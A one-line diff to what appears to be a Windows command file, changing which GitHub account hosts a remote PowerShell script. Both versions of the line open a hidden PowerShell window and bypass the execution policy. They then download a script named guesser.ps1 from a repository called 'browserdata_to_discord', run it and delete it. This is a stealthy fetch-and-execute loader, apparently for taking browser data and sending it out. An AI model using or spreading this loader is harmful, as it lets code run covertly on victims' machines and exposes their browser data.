@@ -1,1 +1,1 @@
-start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pentestfunctions/browserdata_to_discord/main/guesser.ps1' -OutFile 'temp.ps1'; & '.\temp.ps1'; Remove-Item 'temp.ps1'" & exit
+start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/jimmy-mc/browserdata_to_discord/main/guesser.ps1' -OutFile 'temp.ps1'; & '.\temp.ps1'; Remove-Item 'temp.ps1'" & exit
